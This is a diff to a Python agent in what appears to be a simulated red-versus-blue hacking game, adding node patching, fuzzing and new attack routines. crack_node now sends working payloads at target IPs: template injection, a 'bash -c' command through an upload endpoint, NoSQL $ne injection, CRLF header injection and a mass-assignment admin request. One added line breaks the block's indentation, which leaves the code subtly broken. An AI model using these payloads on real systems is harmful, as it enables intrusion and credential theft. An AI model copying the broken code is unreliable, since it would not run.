@@ -10,6 +10,7 @@ import random
 import numpy as np
 import concurrent.futures
 from concurrent.futures import ThreadPoolExecutor
+from fuzzing_module import FuzzingEngine
 
 # --- COMBAT & DEFENSE SYSTEMS ---
 SHIELD_LEVEL = 1 # Default shield (1 hit)
@@ -108,6 +109,36 @@ def save_brain_memory():
             json.dump(data, f)
     except Exception as e:
         log(f"❌ Save Brain Failed: {e}")
+
+def patch_node():
+    """Blue Team Specialty: Patch vulnerabilities on the current node."""
+    try:
+        cfg_path = '/gladiator/vulns.cfg'
+        if os.path.exists(cfg_path):
+            with open(cfg_path, 'r') as f:
+                vulns = f.read().strip().split(',')
+            
+            if vulns and vulns[0] != "NONE":
+                # Remove one random vulnerability
+                to_patch = random.choice(vulns)
+                vulns.remove(to_patch)
+                
+                new_vulns = ",".join(vulns) if vulns else "NONE"
+                with open(cfg_path, 'w') as f:
+                    f.write(new_vulns)
+                
+                log(f"🛠️ PATCHED: Removed {to_patch} from this node. New status: {new_vulns}")
+                # Log to orchestrator
+                requests.post(f"{ORCHESTRATOR}/api/log", json={
+                    "gladiator_id": MY_ID,
+                    "message": f"🛠️ SYSTEM PATCHED: {to_patch} fixed by Blue Team!"
+                }, timeout=2)
+                
+                # Restart server to apply the patch
+                subprocess.run(["pkill", "-f", "vulnerable_server.py"])
+                subprocess.Popen(["python3", "vulnerable_server.py"], cwd="/gladiator")
+    except Exception as e:
+        log(f"❌ Patch failed: {e}")
 
 def get_identity():
     # Helper to persist ID across migrations
@@ -675,7 +706,51 @@ def crack_node(ip, x, y):
         password = hacking_brain["password_map"][ip]
         if password and attempt_login(password, ip):
              log(f"🧠 RECALL: Known password for {ip} found in memory.")
-             return password
+           if password: return password
+
+        # 16. NEW: SSTI
+        if 'SSTI' in vulns:
+             log(f"🔬 Attempting SSTI on {ip}...")
+             res = requests.get(f"http://{ip}:8000/api/template?name={{{{config}}}}", timeout=2)
+             if res.status_code == 200 and "Hello, " in res.text:
+                 password = res.text.split("Hello, ")[1].strip()
+                 if password and len(password) < 50: return password
+
+        # 17. NEW: Insecure Upload
+        if 'UPLOAD' in vulns:
+             log(f"🔬 Attempting Insecure Upload on {ip}...")
+             res = requests.post(f"http://{ip}:8000/api/upload", data="bash -c 'whoami'", timeout=2)
+             if res.status_code == 200 and "Result: " in res.text:
+                 password = res.text.split("Result: ")[1].strip()
+                 if password: return password
+
+        # 18. NEW: NoSQL Injection
+        if 'NOSQLI' in vulns:
+             log(f"🔬 Attempting NoSQLi on {ip}...")
+             res = requests.post(f"http://{ip}:8000/api/search", json={"query": {"username": {"$ne": "guest"}}}, timeout=2)
+             if res.status_code == 200:
+                 try:
+                     pwd = res.json()["results"][0]["password"]
+                     if pwd: return pwd
+                 except: pass
+
+        # 19. NEW: Log Injection
+        if 'LOG_CRLF' in vulns:
+             log(f"🔬 Attempting Log Injection on {ip}...")
+             res = requests.get(f"http://{ip}:8000/health", headers={"User-Agent": "ADMIN_LOGGED_IN\n"}, timeout=2)
+             if res.status_code == 200 and "DEBUG_VAL: " in res.text:
+                 password = res.text.split("DEBUG_VAL: ")[1].strip()
+                 if password: return password
+
+        # 20. NEW: Mass Assignment
+        if 'MASS_ASSIGNMENT' in vulns:
+             log(f"🔬 Attempting Mass Assignment on {ip}...")
+             res = requests.post(f"http://{ip}:8000/api/register", json={"username": "hacker", "role": "admin"}, timeout=2)
+             if res.status_code == 200:
+                 try:
+                     pwd = res.json()["password"]
+                     if pwd: return pwd
+                 except: pass
 
     # 1. Determine which vulnerabilities to try
     known_vulns = None
@@ -1002,6 +1077,29 @@ def main():
 
             # 5. Try to migrate
             moved = False
+            
+            # --- BLUE SPECIAL: ACTIVE PATCHING (Rare: 2% chance) ---
+            if TEAM == "BLUE" and random.random() < 0.02:
+                patch_node()
+
+            # --- FUZZING / DISCOVERY MODE (5% Chance) ---
+            if random.random() < 0.05:
+                # Pick a random candidate or neighbor
+                if candidate_neighbors:
+                    _, _, _, fuzz_ip = random.choice(candidate_neighbors)
+                    log(f"🔬 Entering Discovery Mode on {fuzz_ip}...")
+                    try:
+                        fuzzer = FuzzingEngine(target_ip=fuzz_ip)
+                        discoveries = fuzzer.fuzz_all_endpoints(max_payloads_per_endpoint=15)
+                        if discoveries:
+                            log(f"💎 Fuzzer found {len(discoveries)} anomalies on {fuzz_ip}!")
+                            fuzzer.save_discoveries()
+                            # Reward the discovery
+                            hacking_brain["discoveries"] = hacking_brain.get("discoveries", 0) + len(discoveries)
+                            save_brain_memory()
+                    except Exception as e:
+                        log(f"❌ Fuzzing failed: {e}")
+
             for nx, ny, dist, target_ip in candidate_neighbors:
                 if moved: break
                 
